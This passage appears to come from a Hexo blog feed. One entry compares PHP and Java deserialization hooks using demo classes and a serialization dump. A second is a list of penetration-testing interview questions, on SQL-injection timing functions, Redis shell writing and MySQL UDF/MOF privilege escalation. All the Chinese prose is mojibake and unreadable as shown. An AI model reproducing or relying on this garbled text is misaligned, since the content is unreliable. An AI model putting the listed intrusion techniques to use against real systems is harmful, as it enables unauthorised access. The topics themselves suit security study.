<li><code>readObject</code>å€¾å‘äºè§£å†³<code>ååºåˆ—åŒ–æ—¶ï¼Œå¦‚ä½•å°†åºåˆ—åŒ–å¯¹è±¡è¿›è¡Œè¿˜åŸä¸ºä¸€ä¸ªå®Œæ•´çš„å¯¹è±¡</code></li>
<li><code>__wakeup</code>æ›´å€¾å‘äºè§£å†³<code>ååºåˆ—åŒ–åï¼Œå¦‚ä½•åˆå§‹åŒ–è¿™ä¸ªå¯¹è±¡</code></li>
</ul>
<p>ä¸‹é¢ä»”ç»†åˆ†æè¿™ä¸¤è€…çš„å·®å¼‚ã€‚</p>
<h3 id="phpååºåˆ—åŒ–"><a href="#phpååºåˆ—åŒ–" class="headerlink" title="phpååºåˆ—åŒ–"></a>phpååºåˆ—åŒ–</h3><p>phpåœ¨å¯¹æ•°æ®è¿›è¡Œåºåˆ—åŒ–çš„è¿‡ç¨‹å¼€å‘è€…æ˜¯æ— æ³•ä»‹å…¥çš„ï¼Œåœ¨è°ƒç”¨<code>serialize</code>å‡½æ•°åï¼Œåºåˆ—åŒ–æ•°æ®å°±å·²ç»å®Œæˆï¼Œæœ€åç›´æ¥å¾—åˆ°ä¸€ä¸ªå®Œæ•´çš„å¯¹è±¡ï¼Œå¦‚æœè¿˜æƒ³åœ¨åºåˆ—åŒ–æ•°æ®æµä¸­æ–°å¢æŸä¸€ä¸ªå†…å®¹ï¼Œåªèƒ½å°†å…¶ä¿å­˜åœ¨ä¸€ä¸ªå±æ€§ä¸­ï¼Œæ‰€ä»¥phpçš„åºåˆ—åŒ–ã€ååºåˆ—åŒ–æ˜¯ä¸€ä¸ªçº¯å†…éƒ¨çš„è¿‡ç¨‹ï¼Œè€Œå…¶<code>__sleep</code>ã€<code>__wakeup</code>é­”æœ¯æ–¹æ³•çš„ç›®çš„å°±æ˜¯åºåˆ—åŒ–æˆ–è€…ååºåˆ—åŒ–çš„å‰åæ‰§è¡Œä¸€äº›æ“ä½œã€‚</p>
<p>ä¸€ä¸ªéå¸¸å…¸å‹çš„PHPåºåˆ—åŒ–ä¾‹å­ï¼Œå°±æ˜¯å«æœ‰èµ„æºç±»å‹çš„PHPç±»ï¼Œå¦‚æ•°æ®åº“è¿æ¥ï¼š </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$link</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dsn = <span class="variable">$dsn</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;link = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$this</span>-&gt;dsn, <span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>PHPä¸­ï¼Œèµ„æºç±»å‹çš„å¯¹è±¡é»˜è®¤æ˜¯ä¸ä¼šå†™å…¥åºåˆ—åŒ–æ•°æ®ä¸­çš„ã€‚é‚£ä¹ˆä¸Šè¿°<code>Connection</code>ç±»çš„ <code>$link</code> å±æ€§åœ¨åº åˆ—åŒ–åå°±æ˜¯<code>null</code>ï¼Œååºåˆ—åŒ–æ—¶æ‹¿åˆ°çš„ä¹Ÿæ˜¯<code>null</code>ã€‚ é‚£ä¹ˆï¼Œå¦‚æœæˆ‘æƒ³è¦ååºåˆ—åŒ–æ—¶æ‹¿åˆ°çš„ <code>$link</code> å°±æ˜¯ä¸€ä¸ªæ•°æ®åº“è¿æ¥ï¼Œæˆ‘å°±éœ€è¦ç¼–å†™ <code>__wakeup</code> æ–¹æ³•ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$link</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dsn = <span class="variable">$dsn</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;link = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$this</span>-&gt;dsn, <span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;dsn&#x27;</span>, <span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯è§ï¼Œè¿™é‡Œ <code>__wakeup</code> çš„å·¥ä½œå°±æ˜¯åœ¨ååºåˆ—åŒ–æ‹¿åˆ°<code>Connection</code>å¯¹è±¡åï¼Œæ‰§è¡Œ <code>connect()</code> å‡½æ•°ï¼Œè¿æ¥æ•° æ®åº“ã€‚</p>
<p> <code>__wakeup</code> çš„ä½œç”¨åœ¨ååºåˆ—åŒ–åï¼Œæ‰§è¡Œä¸€äº›åˆå§‹åŒ–æ“ä½œã€‚ä½†å…¶å®æˆ‘ä»¬å¾ˆå°‘åˆ©ç”¨åºåˆ—åŒ–æ•°æ®ä¼ é€’èµ„æºç±»å‹ çš„å¯¹è±¡ï¼Œè€Œå…¶ä»–ç±»å‹çš„å¯¹è±¡ï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™å°±å·²ç»èµ‹äºˆå…¶å€¼äº†ã€‚ </p>
<p>æ‰€ä»¥ä½ ä¼šå‘ç°ï¼ŒPHPçš„ååºåˆ—åŒ–æ¼æ´ï¼Œå¾ˆå°‘æ˜¯ç”± <code>__wakeup</code> è¿™ä¸ªæ–¹æ³•è§¦å‘çš„ï¼Œé€šå¸¸è§¦å‘åœ¨ææ„å‡½æ•° <code>__destruct</code> é‡Œã€‚å…¶å®å¤§éƒ¨åˆ†PHPååºåˆ—åŒ–æ¼æ´ï¼Œéƒ½å¹¶ä¸æ˜¯ç”±ååºåˆ—åŒ–å¯¼è‡´çš„ï¼Œåªæ˜¯é€šè¿‡ååºåˆ—åŒ–å¯ä»¥ æ§åˆ¶å¯¹è±¡çš„å±æ€§ï¼Œè¿›è€Œåœ¨åç»­çš„ä»£ç ä¸­è¿›è¡Œå±é™©æ“ä½œã€‚</p>
<h3 id="Javaååºåˆ—åŒ–"><a href="#Javaååºåˆ—åŒ–" class="headerlink" title="Javaååºåˆ—åŒ–"></a>Javaååºåˆ—åŒ–</h3><p>ä¸Šç¯‡æ–‡ç« æœ€åæåŠ<code>classAnnotations</code>ï¼Œè¿™é‡Œè®²åˆ°<code>ObjectAnnotations</code>çŸ¥è¯†ã€‚</p>
<p><code>Java</code>åœ¨åºåˆ—åŒ–æ—¶ä¸€ä¸ªå¯¹è±¡ï¼Œå°†ä¼šè°ƒç”¨è¿™ä¸ªå¯¹è±¡<code>writeobject</code>æ–¹æ³•ï¼Œå‚æ•°ç±»å‹æ˜¯<code>ObjectOutputStream</code>ï¼Œå¼€å‘è€…å¯ä»¥å°†ä»»ä½•å†…å®¹å†™å…¥è¿™ä¸ª<code>stream</code>ä¸­ï¼›</p>
<p>ååºåˆ—åŒ–æ—¶ï¼Œä¼šè°ƒç”¨<code>readobject</code>ï¼Œå¼€å‘è€…ä¹Ÿå¯ä»¥ä»è¯»å–å‡ºå‰é¢çš„å†™å…¥çš„å†…å®¹ï¼Œå†è¿›è¡Œå¤„ç†ã€‚</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼Œå±•ç¤º<code>writeobject</code>å’Œ<code>readobject</code>çš„ä½œç”¨ï¼Œ</p>
<p>å…ˆå†™ä¸ª<code>Person</code>ç±»ï¼Œé‡å†™<code>writeobject</code>å’Œ<code>readobject</code>ï¼Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Ser_1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    Person(String name, <span class="type">int</span> age) &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span> <span class="keyword">throws</span></span><br><span class="line">            IOException &#123;</span><br><span class="line">        s.defaultWriteObject();  <span class="comment">//è°ƒç”¨é»˜è®¤å†™å¯¹è±¡ï¼ŒæŠŠPersonç±»ä¸­nameå’Œageåºåˆ—åŒ–å†™å…¥å­—èŠ‚æµä¸­</span></span><br><span class="line">        s.writeObject(<span class="string">&quot;This is a object&quot;</span>); <span class="comment">//é¢å¤–å†™å…¥å­—ç¬¦ä¸²ï¼ŒåŠ åˆ°åºåˆ—åŒ–å¯¹è±¡åé¢ï¼Œå†™å…¥å­—èŠ‚æµä¸­</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();  <span class="comment">//è°ƒç”¨é»˜è®¤è¯»å¯¹è±¡ï¼Œååºåˆ—åŒ–Personç±»ä¸­nameå’Œage</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> (String) s.readObject();  <span class="comment">//è¯»å–å†™å…¥å­—ç¬¦ä¸²</span></span><br><span class="line">        System.out.println(str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John&quot;</span>, <span class="number">20</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;per.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(p);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;per.ser&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼Œ</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)]/image-20231104085645456.png" alt="image-20231104085645456"></p>
<p>æœ€åç”¨å·¥å…·<code>SerializationDumper</code>å¾—åˆ°ååºåˆ—åŒ–å†…å®¹ï¼Œ</p>
<blockquote>
<p>java -jar .\SerializationDumper.jar -r .\test\per.ser</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">STREAM_MAGIC - <span class="number">0xac</span> ed</span><br><span class="line">STREAM_VERSION - <span class="number">0x00</span> <span class="number">05</span></span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - <span class="number">0x73</span></span><br><span class="line">    TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">      className</span><br><span class="line">        Length - <span class="number">12</span> - <span class="number">0x00</span> 0c</span><br><span class="line">        Value - Ser_1.Person - <span class="number">0x5365725f312e506572736f6e</span></span><br><span class="line">      serialVersionUID - <span class="number">0xb5</span> <span class="number">13</span> 8a f8 <span class="number">13</span> b1 5c a7</span><br><span class="line">      newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">00</span></span><br><span class="line">      classDescFlags - <span class="number">0x03</span> - SC_WRITE_METHOD | SC_SERIALIZABLE</span><br><span class="line">      fieldCount - <span class="number">2</span> - <span class="number">0x00</span> <span class="number">02</span></span><br><span class="line">      Fields</span><br><span class="line">        <span class="number">0</span>:</span><br><span class="line">          Int - I - <span class="number">0x49</span></span><br><span class="line">          fieldName</span><br><span class="line">            Length - <span class="number">3</span> - <span class="number">0x00</span> <span class="number">03</span></span><br><span class="line">            Value - age - <span class="number">0x616765</span></span><br><span class="line">        <span class="number">1</span>:</span><br><span class="line">          Object - L - <span class="number">0x4c</span></span><br><span class="line">          fieldName</span><br><span class="line">            Length - <span class="number">4</span> - <span class="number">0x00</span> <span class="number">04</span></span><br><span class="line">            Value - name - <span class="number">0x6e616d65</span></span><br><span class="line">          className1</span><br><span class="line">            TC_STRING - <span class="number">0x74</span></span><br><span class="line">              newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">01</span></span><br><span class="line">              Length - <span class="number">18</span> - <span class="number">0x00</span> <span class="number">12</span></span><br><span class="line">              Value - Ljava/lang/String; - <span class="number">0x4c6a6176612f6c616e672f537472696e673b</span></span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_NULL - <span class="number">0x70</span></span><br><span class="line">    newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">02</span></span><br><span class="line">    classdata</span><br><span class="line">      Ser_1.Person</span><br><span class="line">        values</span><br><span class="line">          <span class="title function_">age</span></span><br><span class="line">            <span class="params">(<span class="type">int</span>)</span><span class="number">20</span> - <span class="number">0x00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">14</span></span><br><span class="line">          name</span><br><span class="line">            (object)</span><br><span class="line">              TC_STRING - <span class="number">0x74</span></span><br><span class="line">                newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">03</span></span><br><span class="line">                Length - <span class="number">4</span> - <span class="number">0x00</span> <span class="number">04</span></span><br><span class="line">                Value - John - <span class="number">0x4a6f686e</span></span><br><span class="line">        objectAnnotation</span><br><span class="line">          TC_STRING - <span class="number">0x74</span></span><br><span class="line">            newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">04</span></span><br><span class="line">            Length - <span class="number">16</span> - <span class="number">0x00</span> <span class="number">10</span></span><br><span class="line">            Value - This is a object - <span class="number">0x546869732069732061206f626a656374</span></span><br><span class="line">          TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å†™å…¥çš„å­—ç¬¦ä¸² <code>This is a object</code> è¢«æ”¾åœ¨ <code>objectAnnotation</code> çš„ä½ç½®ï¼Œå¹¶ä¸”ä½äº<code>Person</code>ç±»çš„<code>name</code>å’Œ<code>age</code>çš„åé¢ã€‚ åœ¨ååºåˆ—åŒ–æ—¶ï¼Œè¯»å–äº†è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶å°†å…¶è¾“å‡ºã€‚</p>
<blockquote>
<p>è¿™ä¸ªç‰¹æ€§å°±è®©<code>Java</code>çš„å¼€å‘å˜å¾—éå¸¸çµæ´»ã€‚æ¯”å¦‚åé¢å°†ä¼šè®²åˆ°çš„<code>HashMap</code>ï¼Œå…¶å°±æ˜¯å°†<code>Map</code>ä¸­çš„æ‰€æœ‰é”®ã€ å€¼éƒ½å­˜å‚¨åœ¨ <code>objectAnnotation</code> ä¸­ï¼Œè€Œå¹¶ä¸æ˜¯æŸä¸ªå…·ä½“å±æ€§é‡Œã€‚</p>
</blockquote>
<p>å¯¹äºJavaåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œå¯ä»¥æ›´åŠ è¯¦ç»†çš„åˆ†æï¼Œ</p>
<blockquote>
<p>é¦–å…ˆ<code>writeObject</code>æ˜¯å¯¹å¯¹è±¡è¿›è¡Œåºåˆ—åŒ–ï¼Œè€Œ<code>readObject</code>æ˜¯å¯¹å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–</p>
<p>åºåˆ—åŒ–æ•°æ®åæ— æ³•é€šè¿‡èµ‹å€¼ä¿®æ”¹ï¼Œ</p>
<p>è€Œåºåˆ—åŒ–ä¹‹å‰ä»¥åŠååºåˆ—åŒ–ä¹‹åï¼Œå¯ä»¥è¿›è¡Œèµ‹å€¼ä¿®æ”¹æ•°æ®</p>
</blockquote>
<p>å°±æ‹¿ä¸Šé¢çš„ä»£ç è¿›è¡Œå±•ç¤ºï¼Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span> <span class="keyword">throws</span></span><br><span class="line">           IOException &#123;</span><br><span class="line">       age = age + <span class="number">100</span>;</span><br><span class="line">       s.defaultWriteObject();</span><br><span class="line">       s.writeObject(<span class="string">&quot;This is a object&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨è°ƒç”¨é»˜è®¤å†™å¯¹è±¡è¿›è¡Œåºåˆ—åŒ–å‰ï¼Œå°†<code>age</code>åŠ ä¸Š<code>100</code>ï¼Œç„¶åç”¨å·¥å…·çœ‹çœ‹ååºåˆ—åæ•°æ®ï¼Œ</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)]/image-20231104100930112.png" alt="image-20231104100930112"></p>
<p>ä½†æ˜¯å¦‚æœå°†è¿™ä¸ªåŠ <code>100</code>å†™åˆ°åºåˆ—åŒ–åè¿›è¡Œï¼Œå°±æ— æ³•å®ç°ï¼Œæ— æ³•è¦†ç›–åºåˆ—åŒ–æ•°æ®ä¸­ageçš„å€¼</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)]/image-20231104101020500.png" alt="image-20231104101020500"></p>
<p>ä½†æ˜¯ååºåˆ—åŒ–å°±æœ‰ç‚¹æ„æ€äº†ï¼Œå¦‚ä¸‹ä»£ç </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    age = age + <span class="number">100</span>;</span><br><span class="line">    System.out.println(age);</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    System.out.println(age);</span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> (String) s.readObject();</span><br><span class="line">    System.out.println(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)]/image-20231104103730076.png" alt="image-20231104103730076"></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œ<code>age = age + 100</code>åæ‰“å°çš„ç»“æœæ˜¯<code>100</code>ï¼Œä¹Ÿå°±æ˜¯åœ¨<code>readObject</code>ä¸­<code>age = 0</code>ã€‚</p>
<p>ä½†æ˜¯åœ¨å®ä¾‹åŒ–ç±»çš„æ—¶å€™ï¼Œå·²ç»å‘æ„é€ å‡½æ•°èµ‹äº†åˆå§‹å€¼ï¼Œ<code>age = 20</code>ï¼Œåº”è¯¥æ¥è¯´è¿™é‡Œçš„æ‰“å°çš„ç¬¬ä¸€ä¸ªç»“æœåº”è¯¥æ˜¯<code>120</code></p>
<p>å¯ä»¥å…ˆè°ƒè¯•çœ‹çœ‹ï¼Œ</p>
]]></content>
      <categories>
        <category>Javaæ¼«è°ˆå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Key_Remember</title>
    <url>//post/Key/</url>
    <content><![CDATA[<p><code>é¢è¯•åï¼Œå‘ç°è‡ªå·±çŸ¥è¯†ç‚¹å¤ä¹ ä¸åˆ°ä½ï¼Œå­¦ä¹ ä¸æ·±å…¥ï¼Œç‰¹æ­¤è®°å½•å­¦ä¹ </code></p>
<span id="more"></span>

<p>é¢è¯•é—®é¢˜</p>
<blockquote>
<ol>
<li>sqlæ³¨å…¥ä¸­çš„å»¶è¿Ÿå‡½æ•°éƒ½æœ‰å“ªäº›ï¼Ÿ</li>
<li>Benchmark()å‡½æ•°é‡å¤countæ¬¡æ‰§è¡Œè¡¨è¾¾å¼</li>
<li>ç¬›å¡å°”ç§¯</li>
<li>GET_LOCK(str,timeout)</li>
<li>ç»™å­—ç¬¦ä¸²strç»™å®šçš„åå­—å¾—åˆ°ä¸€ä¸ªé”ï¼Œè¶…æ—¶ä¸ºtimeout</li>
<li>RLIKE</li>
<li>é€šè¿‡rpadæˆ–repeatæ„é€ é•¿å­—ç¬¦ä¸²åŠ ä»¥è®¡ç®—é‡å¤§çš„patternï¼Œé€šè¿‡repeatså‚æ•°æ§åˆ¶å»¶æ—¶é•¿çŸ­</li>
</ol>
</blockquote>
<blockquote>
<ol>
<li>å¸¸è§çš„ä¿¡æ¯æœé›†çš„å†…å®¹éƒ½æœ‰å“ªäº›ï¼Ÿ</li>
<li>æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„å¸¸è§„é˜²æŠ¤ç‚¹åŠç»•è¿‡æ–¹å¼æœ‰å“ªäº›ï¼Ÿ</li>
<li>è§£ææ¼æ´æœ‰äº†è§£å—</li>
<li>XSSå’ŒCSRFçš„åŒºåˆ«ï¼Ÿ</li>
<li>CSRFå’ŒSSRFçš„åŒºåˆ«ï¼Ÿ</li>
<li>XXEæ¼æ´æœ‰äº†è§£å—ï¼Œéƒ½æœ‰å“ªäº›åˆ†ç±»ï¼Ÿ</li>
<li>é€»è¾‘æ¼æ´çš„éªŒè¯ç å›æ˜¾å’Œä»»æ„å¯†ç é‡ç½®ï¼Ÿ</li>
<li>shiro</li>
<li>fastjson</li>
<li>phpååºåˆ—åŒ–é­”æ³•å‡½æ•°</li>
<li>javaé‡è½½å’Œé‡å†™çš„åŒºåˆ«</li>
</ol>
</blockquote>
<blockquote>
<ol>
<li>redis ç«¯å£ï¼Ÿä¸»ä»å‰¯ç”¨çš„å†™å…¥shellï¼Ÿ</li>
<li>å¸¸è§çš„å†…ç½‘ä¿¡æ¯æ”¶é›†æ–¹å¼ï¼Ÿ</li>
<li>å¸¸è§çš„ææƒæ–¹å¼ï¼Ÿ</li>
<li>mysqlUDFææƒçš„æ–¹å¼ï¼Ÿå‰ææ¡ä»¶éƒ½æœ‰å“ªäº›ï¼Ÿ</li>
<li>mysql  MOFåŠ è½½ææƒâ€”å¯¼å‡ºè‡ªå®šä¹‰mofæ–‡ä»¶åˆ°ç³»ç»Ÿç›®å½•åŠ è½½ï¼Œæ¡ä»¶ï¼ŸåŒudfä¸€æ ·éœ€è¦æ‰‹å·¥ä¿®æ”¹my.inié…ç½®æ–‡ä»¶ï¼Œæ·»åŠ  secure-file-priv&#x3D;</li>
</ol>
</blockquote>
<blockquote>
<ol>
<li>æ€ä¹ˆæŸ¥çœ‹å¤–é“¾ç«¯å£ï¼Ÿ</li>
<li>windowså®‰å…¨æ—¥å¿—é‡Œé¢çš„äº‹ä»¶idï¼Œç™»é™†æˆåŠŸç™»é™†å¤±è´¥çš„äº‹ä»¶idæ˜¯å¤šå°‘</li>
<li>windowséšè—è´¦å·æ€ä¹ˆçœ‹ï¼Ÿ</li>
<li>windows wmicæ€ä¹ˆæŸ¥çœ‹è¿›ç¨‹å‘½ä»¤ï¼Ÿ</li>
<li>å‹’ç´¢ç—…æ¯’å¸¸è§„çš„å¤„ç½®æ–¹æ³•éƒ½æœ‰å“ªäº›ï¼Ÿ</li>
<li>linuxè®¡åˆ’ä»»åŠ¡æ€ä¹ˆçœ‹ï¼Ÿè¿˜æœ‰é‚£äº›ç›®å½•ï¼Ÿå¼€æœºå¯åŠ¨å‘¢ï¼Ÿ</li>
<li>linuxè¿›ç¨‹ç›®å½•æ˜¯å“ªä¸ªï¼Ÿé’ˆå¯¹è¿›ç¨‹ç›®å½•éƒ½æœ‰å“ªäº›åˆ†ææ–¹æ³•ï¼Ÿ</li>
<li>é’ˆå¯¹javaå†…å­˜é©¬æœ‰ä»€ä¹ˆæ£€æµ‹æ–¹å¼å—ï¼Ÿ</li>
</ol>
</blockquote>
<blockquote>
<ol>
<li>sipä¸ŠhwæœŸé—´éƒ½éœ€è¦å…³æ³¨é‚£äº›åŠŸèƒ½ç‚¹ï¼Ÿ</li>
<li>wafå°ç¦ipå¦‚ä½•å°ç¦ï¼Ÿ</li>
</ol>
</blockquote>
<blockquote>
<p>sqlæ³¨å…¥åŸç†<br>åˆ©ç”¨æ–¹é¢âˆ¶<br>1.æœ‰é‚£äº›å†™æ–‡ä»¶æ–¹æ³•ï¼Œå†™å…¥logé‡Œ<br>2.æœ‰é‚£äº›è¯»æ–‡ä»¶æ–¹æ³•ï¼Œ<br>æƒé™é™åˆ¶loadfileï¼Œæ‰€ä»¥éœ€è¦ä¸ªå †å æ¡ä»¶ï¼Œä¸ºä»€ä¹ˆé¦–å…ˆéœ€è¦å †å ï¼Œåˆ›å»ºä¸€ä¸ªåº“ï¼Œ<br>3.è¯»å†™æ–‡ä»¶çš„æƒé™ï¼Œæœ‰å“ªäº›å€¼ï¼Œå¯¹åº”ä»£è¡¨ä»€ä¹ˆ</p>
<p>é™¤äº†MySQLï¼Œå…¶ä»–æ•°æ®åº“è¿˜è¯•è¿‡å“ªäº›</p>
<p>MySQLæ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ–¹å¼</p>
